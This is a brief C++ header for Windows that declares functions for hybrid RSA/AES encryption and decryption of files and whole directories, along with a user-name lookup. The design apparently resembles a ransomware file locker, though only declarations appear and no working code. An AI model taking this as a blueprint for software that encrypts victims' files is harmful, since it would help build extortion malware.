#include <iostream>
#include <windows.h>
#include <string>
#include <vector>
#include <openssl/rsa.h>
#include "AES.hpp"

#define UNLEN 128

using namespace std;

string getUserName();

void EncryptDir(RSA* pubKey, string& dirName);

void EncryptFileByAES(unsigned char* key, string& dirName, string& fileName);

void EncryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher);

void DecryptDir(RSA* pubKey, string& dirName);

void DecryptFileByAES(unsigned char* key, string& dirName, string& fileName);

void DecryptText(unsigned char* plain, unsigned int plainLength, unsigned char* key, unsigned char* cipher);
